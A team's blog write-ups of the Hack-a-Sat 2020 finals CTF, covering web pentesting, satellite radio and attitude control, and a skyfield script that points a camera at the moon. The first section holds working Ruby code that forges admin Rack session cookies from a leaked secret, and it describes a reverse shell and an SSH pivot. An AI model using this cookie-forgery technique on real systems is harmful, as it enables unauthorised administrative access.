---
layout: post
title:  "Hack-a-Sat FInals 2020"
date:   2020-09-08
author: the whole team
tags: [ctf, satellites, space, reversing, protocols]
---

# Hack-a-Sat Finals

These are our writeups for the finals of the [Hack-a-Sat 2020](https://ctftime.org/event/1104) CTF, which took place in early August of this year. The competition was very exciting and novel, with a cool physical flat-sat device given to each team and a very interesting COSMOS-based setup to do CTF hacking on. We were thrilled to take part in the event and are looking forward to future iterations. Finalist teams each had to submit writeups for challenges they solved, which we've posted below.

## Challenge 0 (web/pentest)

This challenge involved a simple web app implemented in Ruby, which we had to pwn to get access to the satellite and enable telemetry. Initially, we had little information besides the information for the IP itself. Browsing to the site, we were presented with a simple page, a login, and an “/admin” path which was visible in the source. When you browse to /admin, we got Rails/Rack error info, indicating apparently that the app was in debug mode.

This debug page leaked a secret token which is used by the Rack gem to generate the session cookies. Using this information, we could almost definitely log in as the admin account. We grabbed that secret and then were able to forge our own valid session cookies via some code we adapted from the Rack gem.

```ruby=
require 'rack'
require 'openssl'
require 'cgi'
 
myval = Rack::Session::Cookie::Base64::Marshal.new
session_data = ("BAh7CEkiD3Nlc3Npb25faWQGOgZFVG86HVJhY2s6OlNlc3Npb246"\
"OlNlc3Npb25JZAY6D0BwdWJsaWNfaWRJIkU1ZWViNmU5M2UzNTc0OD"\
"MxMDhjZGUxOTJmNDUyOThiMmM1OGZmODI5Y2I1ZmQwNDRiNmQzMjc3"\
"ZDE0NzM5MGMzBjsARkkiCWNzcmYGOwBGSSIxK2NydGtMak5NU09iU"\
"E95akdYVWJiVGl0SjN5djFFOU5pNGlxaUsycnNwbz0GOwBGSSINdHJ"\
"hY2tpbmcGOwBGewZJIhRIVFRQX1VTRVJfQUdFTlQGOwBUSSItZDc5N"\
"TgyZGVhMDM0MTA0YTM1MmJkOTAzYmU3MGQ5YmM2ODM0YWZhZAY7AEY"\
"=--2c061beaf41b799f21c4fe2bf4539488a0b8bb33")
session_data, _, digest = session_data.rpartition('--')
session_data = myval.decode(session_data)
 
session_data["user_name"] = "admin"
session_data["is_admin"] = true
 
session_data = myval.encode(session_data)
 
session_data + "--#{OpenSSL::HMAC.hexdigest(
                    OpenSSL::Digest::SHA1.new,
                    "bbtZJIIecRdlyIpD49A9VHywZgqwtycAr",
                    session_data)}"
```

The basic idea here is that the secret value is used as the key for the HMAC protecting the cookie. The cookie itself is a base64’d Ruby hash containing user information and a CSRF token.

After we could forge valid tokens, we set the is_admin flag to true and were able to login in. Once we logged in, we were presented directly with code that let us execute commands on the system, which we quickly pivoted into a connectback shell for maximum comfort. On the system, we found a runner binary which was suid to user, which is useful since we got our shell as user nobody. From there, we snooped around further in the new home directory we could access, and found some interesting IPs (10.100.6.5) and ssh keys that gave us a further target.

```bash
$ vim stuff
$ ssh-keygen -t rsa
$ ssh-copy-id op1@10.100.6.5
$ ssh op1@10.100.6.5
```

Using our newfound ssh key, we pivoted to the op1@10.100.6.5 host and then noticed we got points for completing the challenge. Even better, there was a COSMOS instance running on this IP!

## Challenge 1 (comms)

After we landed the previous challenge, we were able to gain access to the COSMOS system running on 10.100.6.5. This system was actually forwarding packets to a different host, 10.100.6.2, over UDP. In other words, we didn’t have direct access to the underlying satellite on the box. Furthermore, it seems like something is wrong with our radio communications, and we were spinning out of control!

At this point we knew that comms were unreliable due to “spinning”, so we sent the “enable telemetry” command about every 10 seconds until we got a burst. We observed a roughly 2 minute cycle with a 15 second period during which we could send telemetry and get replies. One teammate started a timer to track the comms windows we had, and the rest of us started working on trying to fix our spin. However, we quickly noticed that almost any command we sent to COSMOS (i.e. changing the mode to ‘manual’ or ‘PWM’) would result in a “not on my sat” error message, which we certainly had not seen before on our trophy satellite.

After some experimentation (read: trial and error), we determined that commands to control the torque rods were not being intercepted by the “attacker”. After the first hint (“waiting for teams to solve their comms anomaly”), my teammate recalled descriptions in the manual of anomalous radio configuration. We consulted the user manual regarding the radio configurations. Realizing that the default mode was supposed to be low-rate high-power, we quickly changed our satellite over to that and gained the ability to reliably communicate with it.

## Challenge 2 (sun pointing)

We poked around at what packets we could send without triggering the “not on MY sat :)” flight event message. We eventually realized we could dump the adcs table.

```json=
{
"name": "Eyassat ADCS Control Table",
"description": "Attitude Control Parameters",
"Config": {
   "Mode": 0,
   "YawCmd": 40.000000,
   "PWM_Baseline": 50
},
"DB_Coef": {
   "Deadband": 40.000000,
   "Deadband_ScaleFactor": 1.000000,
   "Extra": 0.000000
},
"PID_Coef": {
   "Kp": 5.000000,
   "Ki": 2.000000,
   "Kd": 2.000000
},
"MagCal": {
   "X": 133.700000,
   "Y": -133.700000,
   "Z": 133.700000
},
"GyroCal": {
   "X": 1.337000,
   "Y": 1.337000,
   "Z": -1.337000
},
}
```

After retrieving the ADCS table we realized we could actually LOAD_TBL the table and use that to change the values, bypassing the “attacker”. Finally, we were able to change the yaw and PWM values, as well as using the mode setting in order to get it to stop spinning and stabilize. After changing the values locally, we then just pushed the file back to the sat and loaded it.

We then used the camera feeds to help determine how well we were sun pointing and figure out what changes needed to be made. We had to figure out the layout of the room from just a few camera angles which made us appreciate more how hard this problem must be on real satellites in space where the only camera, if any, is on the satellite itself.

Before the stickers were placed on the outer satellite shells, we used telemetry data related to solar power to guess which satellite was ours. We determined which satellite on the camera feeds was back in the dark corner when our readings were low, and which one was right next to the light representing the sun when our readings were high. From there we measured out the orbital period and determined when it was passing by specific cameras so that we could schedule when we would be able to see our satellite on camera in the future. Thankfully the period of exactly a quarter of an hour made it a lot easier to determine future times since it was at fixed times each hour. Once the stickers were added it gave us a lot more confidence that we were watching the right satellite each time it was in view of a camera.

We then wasted a significant amount of time attempting to tune the values, not realizing we needed to make a complete orbit to score. We eventually began only tuning once per orbit and dialed in on a yaw value which pointed us close enough to the sun for a complete orbit to score. Our configuration used Mode 2 (PID Sun Tracking) and YAW 40.0.

## On-Orbit

The on-orbit challenge required us to send the satellite a flight plan that would orient it towards the moon and take a picture, all within a certain time-window given by the organizers. The main information we were given was a sample flight program worked out, and the TLE information for the satellite we were to program.

The main problem in this challenge was calculating the quaternion for rotating the satellite so that its camera would point directly at the moon. This mattered because we would ideally rotate the camera when the satellite would be closest to the moon, but with enough time for the satellite to move into position and for the picture to be taken. To handle the initial setup, we wrote a simple script that would load our data into skyfield, an incredibly useful python library for astronomical movement. We had made heavy use of skyfield in the HaS quals and so were familiar with its usage.

```python3=
#!/usr/bin/env python3
from skyfield.api import EarthSatellite, Topos, load
 
planets = load('de421.bsp')
earth = planets['Earth']
moon = planets['Moon']
 
line1 = "1 46266U 19031D   20218.52876597 +.00001160 +00000-0 +51238-4 0  9991"
line2 = "2 46266 051.6422 157.7760 0010355 123.0136 237.1841 15.30304846055751"
ts = load.timescale()
window = ts.utc(2020, 8, 9, 0, 20, range(60 * 10))
satellite = earth + EarthSatellite(line1, line2, name="DEFCON28 SAT", ts=ts)
```

With the code above, we load the TLE for the DEFCON28 SAT, some planetary information, and the time window which we are interested in.

At this point, we began trying to understand how to get the vector we were interested in from the satellite to the moon. If we acquired that vector, we could use scipy’s [align_vectors](https://docs.scipy.org/doc/scipy/reference/generated/scipy.spatial.transform.Rotation.align_vectors.html) method to determine the quaternion directly. That method is intended for use converting multiple vectors in one frame to their equivalent vectors in another frame. In our case, the two vectors would be from the satellite to the moon, and the satellite camera’s current vector position, given to us as a boresight vector.

Unfortunately, we aren’t exceptionally skilled at math, so this proved to be significantly harder than we originally anticipated. We used the python library Skyfield for vector calculations, but for some reason no matter how we derived the vector between the satellite and the moon, we were unable to produce a vector that resulted in 0 error with the example. A large amount of time was spent tweaking the vector calculation, but for some reason the vector was much more accurate on the live problem than it was for the example. Seeing this discrepancy made us doubt our methods and caused us to waste some time trying to understand why our example calculation was so off. 

Ultimately, we ended up getting within the error window by changing the moon calculation in order to use a different data source - we use the `earth.at(t).observe(moon)` and then brute-forced a time that had the smallest error, rather than attempting to calculate the vector between the moon and the satellite directly.

```python3=
# Boresight vector
imaging_camera = np.array([
                    0.0071960999264690,
                    -0.999687104708689,
                    -0.023956394240496
                    ])
# Our original attempt to calculate the satellite <-> moon vector
moonvec = (np.array(earth.at(t).observe(planets['moon']).
    apparent().ecliptic_xyz().km ) -
    ( satellite.at(t).ecliptic_xyz().km ))
 
# Our updated attempt which used skyfield’s code in a more direct fashion
moonvec = np.array(satellite.at(t).observe(moon).position.km)
 
# Solving for the quaternion using scipy’s align_vectors
sol = R.align_vectors([moonvec], [imaging_camera])[0].as_quat()
```

We then plugged this into code that iterated over all possible second intervals in the time window to find one that would have sufficiently low error. At the last second, we submitted a solution that fit within the error tolerance and our mission plan was accepted! This was enough to get us locked in as the 6th solve with only moments to spare, boxing out the remaining 2 teams.

**Final Script**

```python3=
#!/usr/bin/env python3
from skyfield.api import EarthSatellite, Topos, load
from scipy.spatial.transform import Rotation as R
import numpy as np
 
planets = load('de421.bsp')
earth = planets['Earth']
moon = planets['Moon']
 
line1 = "1 46266U 19031D   20218.52876597 +.00001160 +00000-0 +51238-4 0  9991"
line2 = "2 46266 051.6422 157.7760 0010355 123.0136 237.1841 15.30304846055751"
 
# Example
# line1 = "1 46266U 19031D  20208.40655026 .00001349 00000-0 57626-4 0 9995"
# line2 = "2 46266 51.6412 206.4482 0010395 88.8118 271.4054 15.30274909 54207"
ts = load.timescale()
window = ts.utc(2020, 8, 9, 0, 20, range(60 * 10))
satellite = earth + EarthSatellite(line1, line2, name="DEFCON28 SAT", ts=ts)
 
def calc_error(cam, moonvec):
    return np.rad2deg(np.arccos(cam.dot(moonvec) / (np.linalg.norm(cam) * np.linalg.norm(moonvec))))
 
lowest_err = 0.5
best_ans = 0
 
for t in window:
    imaging_camera = np.array([0.0071960999264690, -0.999687104708689, -0.023956394240496])
    moonvec = np.array(satellite.at(t).observe(moon).position.km)
    sol = R.align_vectors([moonvec], [imaging_camera])[0].as_quat()
    #print(sol)
    err = calc_error(imaging_camera, R.from_quat(sol).apply(moonvec))
    if (err < 0.5):
        if (err < lowest_err):
            lowest_err = err
            best_ans = (err, t.utc, sol)
 
print(best_ans)
```
